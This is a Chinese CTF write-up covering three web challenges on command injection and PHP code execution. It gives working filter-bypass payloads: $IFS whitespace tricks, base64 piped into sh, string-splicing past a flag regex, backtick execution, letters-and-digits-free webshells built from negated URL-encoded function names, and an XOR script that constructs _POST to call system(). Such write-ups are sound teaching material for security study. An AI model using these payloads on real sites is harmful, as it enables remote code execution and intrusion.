## 0x00:一些绕过姿势

在遇到的一些web题中，会经常将以下几种给过滤或者进行限制：

1.  空格
    
2.  命令分隔符
    
3.  关键字
    
4.  限制长度
    
5.  限制回显
    

等等，这次就通过题目将这些如何绕过的知识给记录下来。

#### 空格绕过

```
1.  `常见的绕过符号有：`

3.  
    
4.  `#$IFS在linux下表示分隔符，如果不加{}则bash会将IFS解释为一个变量名，`
```

#### 命令分隔

```
1.  `%0a  --换行符，需要php环境`
    
2.  `%0d  --回车符，需要php环境`
```

#### \[GXYCTF2019\]Ping Ping Ping

**——base编码、颠倒顺序、内联执行** ![](../Images/8f91762d99d36f0623ca0c653d6b469c.png) 有两个文件，先查看一下index.php

```
1.  `?ip=1;cat index.php`
    
```

出现fxck your space!，所以空格被过滤掉了，测试发现 `$IFS$9`可以绕过去 ![](../Images/627c7764561a4dbab4c7be87916fcb2e.png) 过滤了很多，而且结合 `preg_match("/.*f.*l.*a.*g.*/",$ip)`基本是不可能使用 `cat fl*.php`这种正则绕过来查看了。

**解法一：** 虽然过滤了bash，但没过滤sh,可以使用下面的方法：

```
1.  `echo Y2F0IC9mbGFn|base64 -d|sh==>cat /flag`
    
```

**payload：**

```
1.  `1;echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$9-d|sh`
    
2.  `#sh是linux中运行shell的命令，bash相当于sh的升级版，sh∈bash`
    
3.  `#Y2F0IGZsYWcucGhw`
    
4.  `#cat flag.php`
    
```

![](../Images/abc56eb008ca99eed4432c098825c5c9.png) **解法二：** 既然flag.php无法直接绕过去，就使用拼接的方法

```
1.  `if(preg_match("/.*f.*l.*a.*g.*/", $ip)){`
    
2.  `    die("fxck your flag!");`
    
3.  `匹配一个字符串中，是否按顺序出现过flag四个字母`
    
```

如果是按照往常的顺序去拼接，是绕不过去的

```
1.  `?ip=127.0.0.1;a=fl;b=ag;cat$IFS$9$a$b.php`
    
```

所以可以颠倒一下顺序

**payload**：

```
1.  `?ip=1;a=ag;b=fl;cat$IFS$1$b$a.php`
    
2.  `#也可以`
    
3.  `?ip=1;a=lag;cat$IFS$9f$a.php`
    
```

**解法三：**

内联执行将反引号内命令的输出作为输入执行。

```
1.  `` ?ip=1;cat$IFS$9`ls` ``
    
```

#### \[极客大挑战 2019\]RCE ME

**——无字母数字构造webshell、绕过disable\_functions** ![](../Images/f5736bdaa43920430776f931c33479c8.png) 这串代码过滤了全部的字母和数字，之前的绕过方法都不起作用了，就只能编写一个不使用数字和字母的webshell。

在构造前，要先了解一下php5\\php7的特性 ![](../Images/127afe2eb6a89be6d039570d4b2efc34.png)

```
1.  `1.phpinfo() #php5、php7可执行`
    
2.  `2.(phpinfo)() #php7可执行`
    
3.  `3.php5中，assert是一个函数，可以通过$f='assert';$f(...);这样的方法来动态执行任意代码。`
    
4.  `4.php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码。`
    
5.  `5.在php7的环境中，可以使用编码转换等形式，将phpinfo转换成一些不可见字符再传入`
    
```

使用URL编码的原因是，在进行“~”(取反)运算时，经常会生成不可见字符。

```
1.  `<?php`
    
2.  `$a = "phpinfo";`
    
3.  `echo urlencode(~$a);`
    
4.  `?>`
    
5.  `%8F%97%8F%96%91%99%90`
    
```

查看一下

```
1.  `?code=(~%8F%97%8F%96%91%99%90)();`
    
2.  `#发现是可以执行的，所以是php7`
    
```

![](../Images/08fdcb77a4b8ba949f65618bafb49231.png) 这里之所以正则没有检测到，是因为后端自动进行了解码，解码为非字母和数字字符，然后eval再执行了取反还原为phpinfo，所以可以绕过去 ![](../Images/cdc23ff806ea9b1d7c90d6b39f018eab.png) 过滤了很多常用的执行系统命令的函数，先尝试读取系统目录,可以使用scandir函数

```
1.  `print_r(scandir('./'));`
    
2.  `print_r`
    
3.  `#%8F%8D%96%91%8B%A0%8D`
    
4.  `(~%8F%8D%96%91%8B%A0%8D)();`
    
5.  `scandir`
    
6.  `#%8C%9C%9E%91%9B%96%8D`
    
7.  `(~%8C%9C%9E%91%9B%96%8D)(('./'));`
    
8.  `#payload:`
    
9.  `(~%8F%8D%96%91%8B%A0%8D)((~%8C%9C%9E%91%9B%96%8D)(("./")));`
    
```

![](../Images/369ed074731c3fcb9788b08edd095d1b.png) 读取一下根目录发现 ![](../Images/81c9902d07264786260255fed39a97f8.png)

```

11.  `(~%8D%9A%9E%9B%99%96%93%9A)((~%D0%8D%9A%9E%9B%99%93%9E%98));`
     
12.  `#读取readflag有回显`
     
```

![](../Images/27eaa81c3685fae86d4cb3d4843ac8c3.png) 那接下来只能传马连接了，fuzz一下发现eval\\assert函数都没有被ban

```
1.  `(~%9A%89%9E%93)((~%BE%8D%8D%9E%86)[(~%9E)]);`
```

#### \[CISCN 2019 初赛\]Love Math

**——利用题目白名单进行异或** ![](../Images/ec82f793e1ec9e10a88f198bb9039ea2.png) 这道题和上面的就不同了。过滤了一些符号，关键是最后要从输入的内容种提取跟白名单进行对比，如果不是白名单的函数再会报错，所以这道题不能再去网上找通用绕过payload了，就算找了也没用。

唯一的思路就是利用白名单里面的函数进行异或（^没有被过滤），得到我们想要获取的字符串 ![](../Images/9928ea8ceae41fc8e277986b2988f44a.png) 白名单中有dechex、decoct等，这些没被过滤，可以写一个脚本让白名单里面的函数和转换后的数字进行异或，得到结果

```
1.  `<?php`
    
2.  `$whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh']; `
    
3.  `foreach ($whitelist as $white){`
    
4.  `    for($a=1;$a<999999;$a++) {`
    
5.  `        $result = $white^dechex($a);#使用decoct也可以`
    
6.  `        if(strpos($result,'_POST') === 0){`
    
7.  `            echo $white." ".$a;`
    
8.  `            echo $result;`
    
9.  `            echo "\n";`
    
10.  `        }`
     
11.  `    }`
     
12.  `}`
     
13.  `# hexdec 481137_POST`
     
```

![](../Images/f8e57039cc284020b6238aacbaa81515.png) 构造出来的\_POST,\[\]被过滤了，可以使用{}来代替。

**payload：**

```
1.  `?c=$log=${hexdec^dechex(481137)};$log{cos}($log{abs});`
    
2.  `#这里找的变量名必须是白名单里面的，最好选取短一些的函数，因为有长度限制的`
    
3.  `POST DATA:`
    
4.  `cos=system&abs=ls`
    
```

接下来查看flag就可以了
